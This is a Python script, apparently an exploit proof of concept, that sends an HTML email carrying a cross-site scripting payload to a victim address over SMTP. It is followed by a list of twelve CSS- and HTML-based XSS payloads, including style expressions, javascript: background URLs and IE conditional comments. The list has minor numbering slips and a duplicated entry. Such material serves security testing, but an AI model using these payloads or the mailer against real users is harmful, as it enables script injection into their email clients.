#!/usr/bin/python
 
import smtplib, urllib2
 
payload = '''<DIV STYLE="background-image: url(javascript:alert('XSS'))">'''
 
def sendMail(dstemail, frmemail, smtpsrv, username, password):
        msg  = "From: abc@xyz.local\n"
        msg += "To: victim@xyz.local\n"
        msg += 'Date: Today\r\n'
        msg += "Subject: XSS payload\n"
        msg += "Content-type: text/html\n\n"
        msg += payload + "\r\n\r\n"
        server = smtplib.SMTP(smtpsrv)
        server.login(username,password)
        try:
                server.sendmail(frmemail, dstemail, msg)
        except Exception, e:
                print "[-] Failed to send email:"
                print "[*] " + str(e)
        server.quit()
 
username = "test@test.com"
password = "123456"
dstemail = "test@test.com"
frmemail = "abc@xyz.local"
smtpsrv  = "X.X.X.X"
 
print "[*] Sending Email"
sendMail(dstemail, frmemail, smtpsrv, username, password)
 
'''
# Payloads
[+] Payload 1 : DIV background-image 1
[+] Code for 1 : <DIV STYLE="background-image: url(javascript:alert('XSS'))">
------------
[+] Payload 2 : DIV background-image 2
[+] Code for 2 : <DIV STYLE="background-image: url(javascript:alert('XSS'))">
------------
[+] Payload 3 : DIV expression
[+] Code for 3 : <DIV STYLE="width: expression(alert('XSS'));">
------------
[+] Payload 4 : IMG STYLE w/expression
[+] Code for 4 : exp/*<XSS STYLE='no\xss:noxss("*//*");
xss:ex&#x2F;*XSS*//*/*/pression(alert("XSS"))'>
------------
[+] Payload 5 : List-style-image
[+] Code for 5 : <STYLE>li {list-style-image: url("javascript:alert('XSS')");}</STYLE><UL><LI>XSS
------------
[+] Payload 6 : STYLE w/Comment
[+] Code for 6 : <IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">
------------
[+] Payload 7 : STYLE w/Anonymous HTML
[+] Code for 7 : <XSS STYLE="xss:expression(alert('XSS'))">
------------
[+] Payload 8 : STYLE w/background-image
[+] Code for 8 : <STYLE>.XSS{background-image:url("javascript:alert('XSS')");}</STYLE><A CLASS=XSS></A>
------------
[+] Payload 9 : TABLE
[+] Code for 9 : <TABLE BACKGROUND="javascript:alert('XSS')"></TABLE>
------------
[+] Payload 10 : TD
[+] Code for 11 : <TABLE><TD BACKGROUND="javascript:alert('XSS')"></TD></TABLE>
------------
[+] Payload 12 : Commented-out Block
[+] Code for 12 : <!--[if gte IE 4]>
<SCRIPT>alert('XSS');</SCRIPT>
<![endif]-->
'''
